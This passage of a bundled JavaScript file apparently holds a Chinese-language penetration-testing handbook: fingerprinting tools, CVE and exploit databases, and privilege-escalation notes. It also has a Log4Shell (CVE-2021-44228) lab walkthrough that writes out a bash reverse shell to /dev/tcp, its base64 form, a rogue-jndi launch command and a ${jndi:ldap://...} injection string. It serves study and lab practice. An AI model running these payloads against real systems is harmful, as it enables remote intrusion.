                  Spring framework\u8FDC\u7A0B\u547D\u4EE4\u6267\u884C

          `))}]},k={name:"\u3010RPC\u3011_\u3010RMI\u3011_\u624B\u518C",steps:[A,W]},z=k,Q=n("QL8i"),Z=n("XRD2"),uu=n("6CFD"),nu=n("eFOt"),iu,cu=g.l.singleATag_blank,Bu={name:"\u3010wappalyzer\u3011    (\u6D4F\u89C8\u5668\u63D2\u4EF6)",desc:e.a.createElement(e.a.Fragment,null),content:e.a.createElement(e.a.Fragment,null,F.a.\u8F6C\u5316\u8001\u6587\u672C_\u4E3Apre\u6807\u7B7E(`

  wappalyzer                                                    \uFF08\u6D4F\u89C8\u5668\u63D2\u4EF6\uFF09

      \u7F51\u9875\u5206\u6790\u63D2\u4EF6\u3002
      \u7F51\u7AD9\u670D\u52A1\u5206\u6790\uFF0C\u6240\u4F7F\u7528\u7684\u63D2\u4EF6\u3002

      \u5404\u79CD\u4E2D\u95F4\u4EF6\u3001\u64CD\u4F5C\u7CFB\u7EDF\uFF0C\u7684\u5224\u65AD\uFF1A

          1.\u539F\u56E0\uFF1A
              1.\u5F88\u591A\u5DE5\u5177\uFF0C\u9700\u8981\u6839\u636E\u3010\u4E2D\u95F4\u4EF6\u3011\u3001\u3010\u64CD\u4F5C\u7CFB\u7EDF\u3011\uFF0C\u6765\u5B9A\u4E0B  \u547D\u4EE4\u7B56\u7565\u3002

          2.\u5305\u542B\uFF1A
              1. ASP\u3001ASPX\u3001JSP\u3001PHP
              2. Nginx\u3001Apache


          `))},Au={name:"\u3010\u4FE1\u606F\u6536\u96C6\u3011_\u3010\u5185\u7F51\u4FE1\u606F\u6536\u96C6\u3011_\u5404\u4E2A\u3010\u7248\u672C\u3011_\u76F8\u5173\u3010CVE\u3011_\u624B\u518C",steps:[uu.b,{name:"\u300A\u5B9A\u6027\u300B\uFF0C\u786E\u5B9A\u65B9\u5411\u2014\u2014\u5177\u4F53\u662F\u54EA\u4E2A\u3010\u7CFB\u5217\u6846\u67B6\u3011",desc:e.a.createElement(e.a.Fragment,null),steps:[Bu]},{name:"\u300A\u5B9A\u91CF\u300B\uFF0C\u786E\u5B9A\u7248\u672C\u2014\u2014\u4E0D\u540C\u6846\u67B6\uFF0C\u3010\u6307\u5B9A\u7248\u672C\u3011\u4E0B\u7684\u5DF2\u77E5\u6F0F\u6D1E",desc:e.a.createElement(e.a.Fragment,null),steps:[{name:"\u3010\u6F0F\u6D1E\u3011\u4FE1\u606F",desc_styles:Object(g.p)(400),desc:e.a.createElement(e.a.Fragment,null,e.a.createElement("pre",null,`

          \u57FA\u672C\u7684\u3010\u5DF2\u77E5\u5B58\u5728\u6F0F\u6D1E\u3011\u7684\u516C\u5F00\u4FE1\u606F

          \u3010\u4E91\u670D\u52A1\u5668\u5382\u5546\u3011\u6700\u5728\u610F

          `)),content:e.a.createElement(e.a.Fragment,null,F.a.\u8F6C\u5316\u8001\u6587\u672C_\u4E3Apre\u6807\u7B7E(Object(u.e)(iu||(iu=Object(t.a)([`

              ~~~~\u6D4B\u8BD5~~~~\u6D4B\u8BD5~~~~\u6D4B\u8BD5~~~~\u6D4B\u8BD5~~~~\u6D4B\u8BD5~~~~\u6D4B\u8BD5

              `,`


              `,`


              `])),Object(u.c)("\u4E0D\u540C\u6846\u67B6\uFF0C\u6307\u5B9A\u7248\u672C\u4E0B\u7684\u5DF2\u77E5\u6F0F\u6D1E\uFF1A",`

              \u7528\u5728\u3010\u7591\u96BE\u6742\u75C7\u5EFA\u8BAE\u3011\u4E2D\u9002\u5408\uFF0C\u4F46\u7528\u5728\u3010SmartStep\u3011\u4E2D\u4E0D\u9002\u5408\uFF01\uFF01\uFF01\u5177\u4F53\u8981\u6539\u7684\u8BDD\uFF0C\u5C31\u8981\u6539\u3010css\u6837\u5F0F\u3011\u3002
              ~~~~\u6D4B\u8BD5~~~~\u6D4B\u8BD5~~~~\u6D4B\u8BD5~~~~\u6D4B\u8BD5~~~~\u6D4B\u8BD5~~~~\u6D4B\u8BD5

              `,{isCollapse:!0,otherCps:[Object(u.c)("\u6309\u3010\u6846\u67B6\u540D\u3011\uFF0C\u641C\u6240\u6709\u7248\u672C\uFF0C\u7684\u7F51\u7AD9\uFF1A",`

                      \u9AD8\u4EF7\u503C\uFF1A


                          \u901A\u7528\uFF0C\u975E\u5E38\u5168\u9762\uFF0C\u72EC\u4E00\u6863\uFF01\uFF01\uFF01
                              1.
                              \u3010SonaType\u3011\uFF0C\u76EE\u524D\u627E\u5230\u6700\u5168\u9762\u7684\u67E5\u8BE2\uFF01
                                  https://ossindex.sonatype.org/
                                      \u76F4\u63A5\u8FDB\u884C\u641C\u7D22\uFF0C\u6709\u5404\u4E2A\u751F\u6001\u7CFB\u7EDF\u2026\u2026
                                      \u4E3E\u4F8B\uFF1Ahttps://ossindex.sonatype.org/component/pkg:maven/com.alibaba/fastjson
                                      \u540C\u65F6\uFF0C\u3010Shiro\u3011\u4E4B\u7C7B\u7684\uFF0C\u4E5F\u80FD\u67E5\u5230


                          \u4E13\u641C\u3010Maven\u3011\u548C\u3010Java\u3011
                              1.
                              \u7B2C\u4E09\u65B9\uFF0C\u5728\u7EBF\u641C\u7D22\uFF1A
                                  https://snyk.io/vuln/maven

                              2.
                              \u5B98\u65B9Maven\u4ED3\u5E93\uFF0C\u6709\u65F6\u4F1A\u663E\u793A\u3010\u4F9D\u8D56\u9879\u6240\u5B58\u5728\u7684\u6F0F\u6D1E\u3011
                                  \u7ECF\u5178\u4F8B\u5B50\uFF1A
                                      \u652F\u4ED8\u5B9D1\uFF1A       https://mvnrepository.com/artifact/com.alipay.sdk/alipay-sdk-java/3.0.3
                                      \u652F\u4ED8\u5B9D2\uFF1A       https://mvnrepository.com/artifact/com.alipay.sdk/alipay-sdk-java/4.22.81.ALL

                              3.
                              \u8FD9\u4E2A\u4ED8\u8D39\u670D\u52A1\uFF0C\u4F3C\u4E4E\u80FD\u63D0\u4F9B\u76F8\u5F53\u7CBE\u786E\u7684lib\u5E93\u7248\u672C\u4FE1\u606F\u3002  \uFF08\u53EF\u60DC\u8981\u4ED8\u8D39\uFF1F\uFF1F  \uFF09
                                  https://sca.analysiscenter.veracode.com/vulnerability-database/security/denial-of-service-dos/java/sid-35014

                              4.
                              \u4E00\u4E9B\u3010\u96C6\u6210\u3011\u7684\u3010\u7248\u672C\u626B\u63CF\u5668\u3011\uFF0C\u9700\u96C6\u6210\u540E\u624D\u53EF\u4F7F\u7528\uFF1A
                                  \u964C\u964C\u5B89\u5168\uFF0C\u516C\u5F00\u7684\u3010mosec-maven-plugin\u3011\u3002
                                      https://github.com/momosecurity/mosec-maven-plugin
                                          \u9700\u96C6\u6210\u5230\u3010pom.xml\u3011\u6587\u4EF6\u3002

                                  \u58A8\u83F2\u5B89\u5168\uFF0C\u4EE3\u7801\u626B\u63CF\u3010Code Scan\u3011\u3002
                                      \u8D44\u6599\uFF1A
                                          \u4ECB\u7ECD\uFF1Ahttps://www.freebuf.com/articles/web/334704.html
                                          \u5B98\u7F51\uFF1Ahttps://www.murphysec.com/
                                      \u4F18\u7F3A\u70B9\uFF1A
                                          1.\u4E5F\u662F\u4E00\u6B3E\u3010Idea\u63D2\u4EF6\u3011\u3002
                                          2.\u80FD\u591F\u5904\u7406\u3010\u4F9D\u8D56\u7248\u672C\u4FE1\u606F\u3011
                                              \u4F46\u662F\u9700\u8981\uFF1A\u9879\u76EE\u7684\u4F9D\u8D56\u4FE1\u606F\u4F1A\u4E0A\u4F20\u5230\u670D\u52A1\u7AEF\uFF0C\u5E76\u57FA\u4E8E\u58A8\u83F2\u5B89\u5168\u6301\u7EED\u7EF4\u62A4\u7684\u6F0F\u6D1E\u77E5\u8BC6\u5E93\u6765\u8BC6\u522B\u9879\u76EE\u4E2D\u5B58\u5728\u5B89\u5168\u7F3A\u9677\u7684\u4F9D\u8D56\u3002
                                                  \u4E5F\u5C31\u662F\u8BF4\uFF0C\u8FD8\u662F\u8981\u3010\u5728\u7EBF\u4E0A\u4F20\u3011\u3002

                                  OWASP\uFF0C\u7684\u3010Dependency-Check\u3011\u3002
                                      \u8D44\u6599\uFF1A
                                          https://github.com/jeremylong/DependencyCheck
                                      \u4ECB\u7ECD\uFF1B
                                          \u662FOWASP\uFF08Open Web Application Security Project\uFF09\u7684\u4E00\u4E2A\u5B9E\u7528\u5F00\u6E90\u7A0B\u5E8F\uFF0C\u7528\u4E8E\u8BC6\u522B\u9879\u76EE\u4F9D\u8D56\u9879\u5E76\u68C0\u67E5\u662F\u5426\u5B58\u5728\u4EFB\u4F55\u5DF2\u77E5\u7684\uFF0C\u516C\u5F00\u62AB\u9732\u7684\u6F0F\u6D1E\u3002
                                          \u76EE\u524D\uFF0C\u5DF2\u652F\u6301Java\u3001.NET\u3001Ruby\u3001Node.js\u3001Python\u7B49\u8BED\u8A00\u7F16\u5199\u7684\u7A0B\u5E8F\uFF0C\u5E76\u4E3AC/C++\u6784\u5EFA\u7CFB\u7EDF\uFF08autoconf\u548Ccmake\uFF09\u63D0\u4F9B\u4E86\u6709\u9650\u7684\u652F\u6301\u3002
                                          \u800C\u4E14\u8BE5\u5DE5\u5177\u8FD8\u662FOWASP Top 10\u7684\u89E3\u51B3\u65B9\u6848\u7684\u4E00\u90E8\u5206\u3002
                                      \u4F7F\u7528\uFF1A
                                          \u4F5C\u4E3A\u4E00\u6B3E\u5F00\u6E90\u5DE5\u5177\uFF0C\u5728\u591A\u5E74\u6765\u7684\u53D1\u5C55\u4E2D\u5DF2\u7ECF\u652F\u6301\u548C\u8BB8\u591A\u4E3B\u6D41\u7684\u8F6F\u4EF6\u8FDB\u884C\u96C6\u6210\uFF0C\u6BD4\u5982\uFF1A\u547D\u4EE4\u884C\u3001Ant\u3001Maven\u3001Gradle\u3001Jenkins\u3001Sonar\u7B49\u3002

                              5.
                              \u88F8\u626B\u3010\u9879\u76EE\u4F9D\u8D56\u6587\u4EF6\u3011
                                  \u6536\u8D39\uFF1A
                                      \u5947\u5B89\u4FE1\u4EE3\u7801\u536B\u58EB\u3002
                                          \u53EF\u60DC\u4E86\uFF0C\u54EA\u6015\u6536\u8D39\u4E5F\u5F04\u4E0D\u5230\u3002

                          \u901A\u7528\uFF1A
                              1.
                              \u6A21\u7CCA\u7684\uFF0C\u641C\u7D22\u3010\u4EA7\u54C1\u3011+\u3010\u7248\u672C\u53F7\u3011\uFF0C\u5F97\u51FA\u5B8F\u89C2\u7684\u793E\u4F1A\u5DE5\u7A0B\u5B66 \u4FE1\u606F\u3001\u5927\u6570\u636E\u753B\u50CF\u4FE1\u606F
                                  https://vuldb.com/?search.advanced

                              2.
                              \u6BD4\u8F83\u6A21\u7CCA\u7684\u641C\u7D22\uFF0C\u4F46\u6570\u636E\u5E93\u6BD4\u8F83\u5168
                                  https://cve.mitre.org/find/index.html
                                      \u4F7F\u7528\u3010Google\u3011\u68C0\u7D22\u7AD9\u5185\u5185\u5BB9\uFF0C\u6BD4\u8F83\u5168
                                  https://cve.mitre.org/cve/search_cve_list.html
                                      \u53EA\u80FD\u652F\u6301\u3010\u7248\u672C\u6A21\u7CCA\u641C\u7D22\u3011\uFF0C\u5F97\u51FA\u7684\u7248\u672C\u4E0D\u4E00\u5B9A\u7CBE\u786E  \uFF08\u53EF\u80FD\u6709\u8BEF\u62A5\uFF0C\u53EF\u80FD\u6709\u6F0F\u62A5\uFF09
                                          \u641C\u7D22\u65B9\u5F0F\uFF0C\u3010\u4EA7\u54C1 \u7248\u672C\u53F7\u3011

                              3.
                              \u3010cybersecurity-help\u3011
                                  \u7B2C\u4E8C\u79CD\u65B9\u5F0F
                                      \u76F4\u63A5\u501F\u52A9\u3010Google\u3011\u641C\u7D22
                                          \u6F0F\u6D1E\u641C\u7D22\uFF1A\u3010site:cybersecurity-help.cz <\u5173\u952E\u5B57>\u3011
                                          Exp\u641C\u7D22\uFF1A
                                              \u7B2C\u4E00\u79CD\uFF0C\u4ECE\u3010\u6F0F\u6D1E\u8BE6\u60C5\u3011\u7684\u3010Exploit availability\u3011\u8FDB\u53BB
                                              \u7B2C\u4E8C\u79CD\uFF0C\u641C\u7D22\uFF1A\u3010site:cybersecurity-help.cz <\u5173\u952E\u5B57>\u3011
                                          \u516C\u544A\uFF1A
                                              https://www.cybersecurity-help.cz/vdb/SB2021122120
                                  \u7B2C\u4E00\u79CD\u65B9\u5F0F\uFF08\u4E0D\u63A8\u8350\uFF09
                                      https://www.cybersecurity-help.cz/vdb/
                                          \u5229\u7528\u5185\u7F6E\u7684\u641C\u7D22\u529F\u80FD\uFF0C\u4F46\u7ED3\u679C\u5F88\u9E21\u808B

                              4.
                              \u53EF\u80FD\u662F\u53F2\u4E0A\u6700\u8BE6\u7EC6\u7684\u6F0F\u6D1E\u5E93\uFF0C\u4F46\u64CD\u4F5C\u8D77\u6765  \u3010\u624B\u611F\u3001\u65B9\u4FBF\u7A0B\u5EA6\u3011  \u5E76\u4E0D\u662F\u7B2C\u4E00\uFF1A
                                  \u7CBE\u786E\u641C\u7D22\u7B2C\u4E8C\u79CD\uFF1A
                                      https://www.cvedetails.com/vulnerability-list/
                                          \u4F7F\u7528\u65B9\u5F0F\uFF1A
                                              \u9996\u5148\uFF0C\u8F93\u5165\u3010\u4EA7\u54C1 \u7248\u672C\u53F7\u3011  Search \u3002
                                                  \u7ED3\u679C\u4E2D\uFF0C\u7B2C\u4E00\u4E2A\u4E00\u822C\u662F\u3010\u5B89\u5168\u6F0F\u6D1E\u3011
                                              \u8FDB\u5165\u3010\u5B89\u5168\u6F0F\u6D1E\u3011
                                                  \u70B9\u51FB\u3010\u4E0A\u4E00\u7EA7\u3011\uFF0C\u8FDB\u5165\u3010\u6F0F\u6D1E\u6C47\u603B\u7ED3\u679C\u3011
                                                      \u70B9\u51FB\u3010Browse all versions\u3011
                                                          \u7248\u672C\u5206\u6790\uFF1A
                                                              \u90E8\u5206\u662F\u3010\u7CBE\u786E\u7248\u672C\u3011
                                                                  \u6BD4\u8F83\u5C11\u3002
                                                              \u90E8\u5206\u662F\u3010*\u53F7\u6A21\u7CCA\u7248\u672C\u3011
                                                                  \u6BD4\u8F83\u591A
                                                                      \u8BC1\u660E\u4E86\uFF0C\u5176\u5B9E\u3010\u5B98\u65B9\u6743\u5A01\u7F51\u7AD9\u3011\uFF0C\u505A\u7684\u4E5F\u5F88\u591A\u4E0D\u5230\u4F4D\u7684\u5730\u65B9\u3002
                                  \u7CBE\u786E\u641C\u7D22\u7B2C\u4E00\u79CD\uFF1A
                                      \u6309\u3010\u7248\u672C\u53F7\u3011\u7CBE\u786E\u641C\u7D22\uFF0C\u505A\u7684\u5F88\u70C2  \u57FA\u672C\u641C\u4E0D\u5230\u4E1C\u897F\uFF1A
                                          https://www.cvedetails.com/version-search.php

                              5.
                              NVD\u8BE6\u60C5\u641C\u7D22
                                  https://nvd.nist.gov/vuln/search
                                      \u9700\u8981\u8F93\u5165
                                          \u3010Advanced\u9AD8\u7EA7\u641C\u7D22\u3011
                                          \u9012\u8FDB\u8F93\u5165(\u4F1A\u6709\u81EA\u52A8\u63D0\u793A)\uFF1A\u3010CPE Vendor \u63D0\u4F9B\u5546\u3011\u3001\u3010CPE Product \u4EA7\u54C1\u3011\u3001\u3010\u7248\u672C\u53F7\u3011

                          \u8F6F\u4EF6\u6210\u5206\u5206\u6790\uFF08SCA\u5206\u6790\uFF09
                              https://www.murphysec.com/ant-design/pro-components
                                      ant-design/pro-components \u5B89\u5168\u6F0F\u6D1E\u68C0\u6D4B\u62A5\u544A\u3001\u8BB8\u53EF\u8BC1\u5408\u89C4\u5206\u6790\u53CASBOM\u6E05\u5355 - \u58A8\u83F2\u5B89\u5168

                          \u5176\u5B83
                              1.
                              \u4E00\u4E2A\u8D77\u540D\u53EB\u65AF\u8BFA\u767B\uFF0C\u770B\u4E0A\u53BB\u4E5F\u975E\u5E38\u795E\u5947\u7684\u7AD9\uFF01\uFF08\u4F46\u662F\uFF0C\u6211\u8FD8\u6CA1\u641E\u61C2\uFF0C\u5B83\u662F\u600E\u4E48\u8FD0\u4F5C\u7684\uFF1F\uFF09
                                  \uFF01\uFF01\uFF01
                                  https://issueantenna.com/repo/snowdensb/nibrs/issues/338

                      \u4E2D\u4EF7\u503C\uFF1A

                          1.
                          \u5F88\u5927\uFF0C\u4F46\u4E0D\u662F\u5F88\u5168
                              \uFF08\u5F88\u5927\u2014\u2014\u2014\u2014\u2014\u2014\u7528\u4E8ESCA\u9759\u6001\u4EE3\u7801\u5206\u6790\uFF09
                              \uFF08\u4E0D\u662F\u5F88\u5168\u2014\u2014\u2014\u2014\u2014\u2014\u3010FastJson\u6F0F\u6D1E\u3011\u591A\u4E2A\u7248\u672C\u7F3A\u5931\uFF09
                                  https://deps.dev/
                                      \u4E3E\u4F8B\uFF1Ahttps://deps.dev/maven/com.alibaba%3Afastjson/1.2.68

                          2.
                          \u6709\u7C7B\u4F3C\u529F\u80FD\uFF0C\u4F46\u6570\u636E\u6BD4\u8F83\u6B8B\u7F3A\uFF1A
                              https://www.sourceclear.com/vulnerability-database/security/remote-code-execution-rce/java/sid-3663
                              https://www.sourceclear.com/vulnerability-database/security/download-hijacking/javascript/sid-3023
                              https://www.sourceclear.com/vulnerability-database/security/sca/vulnerability/sid-20567/summary
                              https://www.sourceclear.com/vulnerability-database/security/authorization-bypass/os/sid-28566

                  `,{isCollapse:!0})]}),Object(u.c)("Jenkins\uFF0C\u5B98\u65B9\u5DF2\u77E5\u6F0F\u6D1E\uFF0C\u6240\u6709\u4E00\u89C8\u5217\u8868\uFF1A",`

                  https://www.jenkins.io/security/advisories/
              `,{isCollapse:!0}))))},{name:"\u3010PoC\u3011\u4FE1\u606F",desc:e.a.createElement(e.a.Fragment,null,`
            \u57FA\u672C\u7684\u4E00\u4E2A\u3010\u6982\u5FF5\u8BC1\u660E\u3011\u3002
            \u8BF4\u660E\u771F\u7684\u662F\u5B58\u5728\u7684

            \u3010\u626B\u63CF\u5668\u3011\u6700\u5728\u610F

          `),content:e.a.createElement(e.a.Fragment,null,F.a.\u8F6C\u5316\u8001\u6587\u672C_\u4E3Apre\u6807\u7B7E(`

              `))},{name:"\u3010Exp\u3011\u4FE1\u606F",desc:e.a.createElement(e.a.Fragment,null,`
            \u6210\u719F\u7A33\u5B9A\uFF0C\u53EF\u4EE5\u83B7\u5F97shell\u7684

            \u3010\u6E17\u900F\u7EA2\u961F\u3011\u6700\u5728\u610F
          `),steps:[nu.ExploitDB_SearchSploit_MetaSploit_MSF_\u624B\u518C,{name:"\u5176\u5B83\u7684\u4E00\u4E9B\u7F51\u7AD9       (\u9646\u7EED\u8865\u5145)",desc:e.a.createElement(e.a.Fragment,null),content:e.a.createElement(e.a.Fragment,null,F.a.\u8F6C\u5316\u8001\u6587\u672C_\u4E3Apre\u6807\u7B7E(`

                  \u641C\u7D22\u5E73\u53F0\u4E00\uFF1A
                      https://sploitus.com/

                  `))}]}]}]},yu=Au,G=Bu,K=g.l.singleATag_blank,N={name:"\u3010\u7F51\u7AD9\u3011_\u3010Http\u3011_\u624B\u518C",steps:[{name:"\u4ECB\u7ECD",desc:e.a.createElement(e.a.Fragment,null),content:e.a.createElement(e.a.Fragment,null,F.a.\u8F6C\u5316\u8001\u6587\u672C_\u4E3Apre\u6807\u7B7E(`

          \u72B6\u6001\u7801\uFF1A
              200
              301
              404
          `))},G,{name:"\u3010\u654F\u611F\u5185\u5BB9\u3011\u641C\u7D22",desc:e.a.createElement(e.a.Fragment,null),content:Promise.all([n.e(186).then(n.bind(null,"BZJN"))]).then(function(Xu){var $u=Object(y.a)(Xu,1),ne=$u[0];return e.a.createElement(e.a.Fragment,null,F.a.\u8F6C\u5316\u8001\u6587\u672C_\u4E3Apre\u6807\u7B7E(`

                \u5E38\u89C1\u5BFC\u51FA\u65B9\u5F0F\uFF1A
                    \u7B2C\u4E00\u79CD\uFF0C\u624B\u52A8\u590D\u5236\u3010response\u3011
                    \u7B2C\u4E8C\u79CD\uFF0C\u4ECE\u6D4F\u89C8\u5668\u5BFC\u51FA\u3010HAR\u6587\u4EF6\u3011\uFF0C\u7136\u540E\u5168\u6587  \u4E22\u8FDB\u641C\u7D22\u680F\u3002

                `,ne.\u7F51\u7AD9\u654F\u611F\u5185\u5BB9____\u7591\u96BE\u6742\u75C7_\u641C\u7D22____\u4E8C\u7EA7\u624B\u518C))})}]},X=N,ou=g.l.singleATag_blank,Cu={name:"\u3010\u8D8A\u6743\u3011_\u3010\u672A\u6388\u6743\u3011_\u624B\u518C",steps:[{name:"\u57FA\u672C\u4ECB\u7ECD",desc:e.a.createElement(e.a.Fragment,null),content:e.a.createElement(e.a.Fragment,null,F.a.\u8F6C\u5316\u8001\u6587\u672C_\u4E3Apre\u6807\u7B7E())},{name:"\u3010\u6C34\u5E73\u8D8A\u6743\u3011",desc:e.a.createElement(e.a.Fragment,null),content:e.a.createElement(e.a.Fragment,null,F.a.\u8F6C\u5316\u8001\u6587\u672C_\u4E3Apre\u6807\u7B7E(`

          \u4FEE\u6539\u3010id\u3011\u5E8F\u53F7

          \u4FEE\u6539\u3010\u7B5B\u9009\u9879\u3011

          `))},{name:"\u3010\u5782\u76F4\u8D8A\u6743\u3011",desc:e.a.createElement(e.a.Fragment,null),content:e.a.createElement(e.a.Fragment,null,F.a.\u8F6C\u5316\u8001\u6587\u672C_\u4E3Apre\u6807\u7B7E(`

          \u4FEE\u6539\u3010\u89D2\u8272\u3011
          \u4FEE\u6539\u3010\u6743\u9650\u3011

          \u4FEE\u6539\u3010\u677F\u5757\u3011
              \u5E38\u89C1\u677F\u5757
                  \u4E0A\u4F20
                      upload\u3001_upload
                      uploads\u3001_uploads



          `))},{name:"\u3010\u4E0A\u4E0B\u6587\u8D8A\u6743\u3011 / \u3010\u4E0A\u4E0B\u6587\u3011\u76F8\u5173",desc:e.a.createElement(e.a.Fragment,null),content:e.a.createElement(e.a.Fragment,null,F.a.\u8F6C\u5316\u8001\u6587\u672C_\u4E3Apre\u6807\u7B7E())}]},lu=Cu,vu=g.l.singleATag_blank,Iu={name:"\u3010\u6587\u4EF6\u4E0A\u4F20\u3011_\u624B\u518C",steps:[{name:"\u4ECB\u7ECD",desc:e.a.createElement(e.a.Fragment,null),content:e.a.createElement(e.a.Fragment,null,F.a.\u8F6C\u5316\u8001\u6587\u672C_\u4E3Apre\u6807\u7B7E())}]},Du=Iu,du=n("2jYT"),$=n("+/qY"),fu=g.l.singleATag_blank,pu={name:"\u3010rogue-jndi\u3011 / \u3010RogueJndi\u3011",desc:e.a.createElement(e.a.Fragment,null),steps:[{name:"\u73AF\u5883\u51C6\u5907",desc:e.a.createElement(e.a.Fragment,null),content:e.a.createElement(e.a.Fragment,null,F.a.\u8F6C\u5316\u8001\u6587\u672C_\u4E3Apre\u6807\u7B7E(`
  \u51C6\u5907Java\u7684payload\uFF0C\u6267\u884CRCE
      apt-get  update
      apt-get  install  openjdk-11-jdk
      apt-get  install  maven
              `))},{name:"\u653B\u51FB\u3010CVE-2021-44228\u3011",desc:e.a.createElement(e.a.Fragment,null),content:e.a.createElement(e.a.Fragment,null,F.a.\u8F6C\u5316\u8001\u6587\u672C_\u4E3Apre\u6807\u7B7E(`

      \u4F7F\u7528\u3010rogue-jndi\u3011\u7684Java\u5E94\u7528\uFF0C\u542F\u52A8\u3010\u672C\u5730LDAP\u670D\u52A1\u5668\u3011
          \u4E0B\u8F7D\u4ED3\u5E93\uFF1A\u3010git clone https://github.com/veracode-research/rogue-jndi\u3011
          \u6253\u5305\uFF1A\u3010mvn package\u3011
              \u751F\u6210\u7684jar\u5305\uFF1A
                  \u3010./target/RogueJndi-1.1.jar\u3011

          \u4F20\u5165payload
              \u6211\u4EEC\u4F7F\u7528\u3010base64\u3011\u7F16\u7801\uFF0C\u6765\u907F\u514D\u4E00\u5207\u7F16\u7801\u5F15\u8D77\u7684\u95EE\u9898\uFF1A
                  echo  'bash  -c  bash  -i  >&/dev/tcp/<\u4F60\u7684\u7F51\u5361IP>/<\u4F60\u81EA\u5DF1\u4EFB\u9009\u4E00\u4E2A\u7AEF\u53E3>  0>&1  ' | base64

                      \u3010| base64\u3011\uFF0C\u5C06\u3010\u524D\u9762\u5B57\u7B26\u3011\u4F20\u5165\u3010base64\u547D\u4EE4\u3011

                      \u4E34\u65F6\u751F\u6210\u4E86\u3010YmFzaCAgLWMgIGJhc2ggIC1pICA+Ji9kZXYvdGNwLzEwLjEwLjE0LjU2Lzk5OTkgIDA+JjEgIAo=\u3011

              \u751F\u6210payload\u540E\uFF0C\u4F20\u5165
                  java  -jar  target/RogueJndi-1.1.jar  --command  "bash  -c  {echo,<base64\u5B57\u7B26\u4E32_\u5916\u9762\u4E0D\u5E26\u5F15\u53F7>}|{base64,-d}|{bash,-i}  "  --hostname  "<\u4F60\u7684\u7F51\u5361IP>"
                      \u6B64\u5904\uFF0C\u8981\u5207\u8BB0\uFF0C\u3010{}|{}|{}\u3011\u8FD9\u6837\u7684\u5F62\u5F0F\uFF1A
                          \u4E2D\u95F4\u4E00\u5B9A\u8981\u3010\u7D27\u8FDE\u3011\uFF0C\u4E0D\u80FD\u6709\u3010\u7A7A\u683C\u3011\uFF1B\u4E0D\u7136\u4F1A\u5931\u8D25  (\u4E3A\u4EC0\u4E48\uFF1F\uFF1F\uFF1F\uFF1F\uFF1F\uFF1F)

                      \u7136\u540E\uFF0C\u5C31\u5B8C\u6210\u4E86\u57FA\u672C\u542F\u52A8\u3002

      \u6267\u884CRCE
          \u5728BurpSuite\u4E2D\uFF0C\u5C06\u3010remember\u53C2\u6570\u3011\uFF0C\u6539\u4E3A\u3010"\${jndi:ldap://<\u4F60\u7684\u7F51\u5361IP>:1389/o=tomcat}"\u3011
              \u6CE8\u610F\uFF0C\u6B64\u5904\u5FC5\u987B\u8FDE\u30101389\u3011\u7AEF\u53E3\u3002

          \u7136\u540E\uFF0C\u5F97\u5230\u4E00\u4E2Ashell
              \u54B1\u4EEC\u8FDB\u884C\u3010\u529F\u80FDshell\u3011\u63D0\u5347

      \u5E38\u89C1\u95EE\u9898\uFF1A
          1. \u3010\u9776\u673AIP\u3011\u53D8\u5316\uFF0C\u6B64\u65F6\u3010BurpSuite\u3011\u7684\u8BF7\u6C42\u4FE1\u606F\uFF0C\u9700\u8981\u91CD\u65B0\u4FEE\u6539
              \u6211\u4E4B\u524D\u72AF\u7684\u9519\u8BEF\uFF0C\u5C31\u662F\u53EA\u6539\u4E86\u3010Host\u3011\uFF1B\u800C\u6CA1\u6709\u6539\u3010Referer\u3011\u3001\u3010Origin\u3011\u3002
              `))}]},Tu={name:"\u3010JNDI\u3011_\u3010LDAP\u3011_\u624B\u518C",steps:[{name:"\u57FA\u672C\u4ECB\u7ECD",desc:e.a.createElement(e.a.Fragment,null),content:e.a.createElement(e.a.Fragment,null,F.a.\u8F6C\u5316\u8001\u6587\u672C_\u4E3Apre\u6807\u7B7E(`

          \u7EC4\u5408\u6307\u4EE4
              \u3010"\${jndi:ldap://10.10.14.56/whatever}"\u3011


          \u4E24\u8005\uFF0C\u4E4B\u6240\u4EE5\u5982\u6B64\u91CD\u8981\u3001\u5982\u6B64\u5E38\u89C1\uFF0C\u662F\u56E0\u4E3A\uFF1A
              \u3010log4j2\u3011\u4E2D\uFF0C\u80FD\u591F\u89E3\u6790\u5230\u3010jndi\u534F\u8BAE\u3011

                  \u800C\u3010jndi\u3011\u548C\u3010ldap\u3011\uFF0C\u672C\u8EAB\u5C31\u662F\u3010\u8F7B\u578B\u76EE\u5F55\u534F\u8BAE\u3011\uFF1B\u4E5F\u662F\u7ECF\u5E38\u88AB\u534F\u8BAE\u67E5\u8BE2\u7684\u4E00\u79CD\u534F\u8BAE\u3002
                      \u81F3\u4E8E\u4E3A\u4EC0\u4E48\uFF1F\uFF1F\u6211\u8FD8\u4E0D\u77E5\u9053\uFF1F\uFF1F\uFF1F

                      \u6240\u4EE5\uFF0C\u53D8\u5F97\u6108\u53D1\u773C\u719F

                  lookup\uFF0C\u8FD9\u79CD\u88AB\u770B\u6EE5\u4E86

              \u4E3A\u4EC0\u4E48\u3010SPI\u3011\u548C\u3010jndi\u3011\uFF0C\u4F1A\u51FA\u73B0\u5728\u3010\u65E5\u5FD7\u6846\u67B6\u3011\uFF1F\uFF1F\uFF1F
                  \u8D44\u6599\uFF1Ahttps://juejin.cn/post/7041353521769218085

                  Java\u7684\u53CD\u5C04\u5F88\u5F3A\u5927\uFF0C\u4F46\u662F\u4E5F\u5F88\u5371\u9669\u3002SPI\u529F\u80FD\u7EE7\u627F\u4E86\u8FD9\u4E2A\u7279\u6027\uFF0C\u52C7\u731B\u7684\u66B4\u9732\u4E86\u5B83\u7684\u5F31\u70B9\u3002\u6211\u89C9\u5F97\u529F\u80FD\u5F88\u597D\u554A\uFF0C\u4F46\u5B83\u4E3A\u4EC0\u4E48\u8981\u5B58\u5728\u4E8E\u65E5\u5FD7\u6846\u67B6\u5462\uFF1F
                      \u8FD9\u53EF\u80FD\u662F\u56E0\u4E3A\u5377\u5427\u3002\u6BD5\u7ADF\u4E00\u4E2A\u65E5\u5FD7\u6846\u67B6\uFF0C\u4E5F\u662F\u8981\u6709\u5143\u5B87\u5B99\u7684\u68A6\u60F3\u7684\uFF01
                          \u2026\u2026\u2026\u2026\u2026\u2026\u2026\u2026\u2026\u2026\u2026\u2026\u2026\u2026\u2026\u2026\u2026\u2026\u2026\u2026\u2026\u2026\u2026\u2026\u2026\u2026\u2026\u2026\u2026\u2026\u2026\u2026\u2026\u2026\u2026\u2026\u2026\u2026\u2026\u2026\u2026\u2026

              \u4E00\u4E9B\u626B\u76F2\uFF1A
                  \u8D44\u6599\uFF1A
                      https://juejin.cn/post/7041353521769218085

